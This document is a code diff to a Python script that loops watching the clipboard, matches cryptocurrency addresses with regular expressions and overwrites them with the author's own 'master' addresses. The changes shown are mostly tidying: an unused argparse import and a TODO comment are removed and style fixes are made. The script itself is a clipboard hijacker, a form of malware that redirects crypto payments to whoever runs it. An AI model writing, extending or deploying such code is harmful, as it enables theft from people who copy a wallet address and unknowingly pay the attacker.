@@ -3,14 +3,8 @@ import pyperclip
 import json
 import time
 import re
-import argparse
 import sys
 
-# TODO
-# parser = argparse.ArgumentParser(
-#     description="Replace crypto addresses found in the clipboard with your own"
-# )
-# parser.add_argument("--log", help="log output to log.txt", action="store_true")
 
 def found_crypto(user_clipboard: str) -> str:
     """Returns name of found crypto in user_clipboard"""
@@ -23,7 +17,7 @@ def found_crypto(user_clipboard: str) -> str:
     for crypto_name, crypto_address in regex_addresses.items():
         if bool(re.search(crypto_address, user_clipboard)):
             return crypto_name
-    return None # no crypto found 
+    return None  # no crypto found
 
 
 def replace_clipboard(found_crypto: str) -> str:
@@ -34,6 +28,7 @@ def replace_clipboard(found_crypto: str) -> str:
         pyperclip.copy(master_addresses[found_crypto])
         print(f"Replaced:{master_addresses[found_crypto]}")
 
+
 def main():
     print("Watching")
     while True:
@@ -43,12 +38,13 @@ def main():
 
             # check if found
             found_crypto_name = found_crypto(user_clipboard)
-            if found_crypto_name != None:
+            if found_crypto_name is not None:
                 # if so replace
                 print(f"Found:{found_crypto_name}")
                 replace_clipboard(found_crypto_name)
         except KeyboardInterrupt:
             print("Goodbye.")
             sys.exit(0)
+
 
 main()
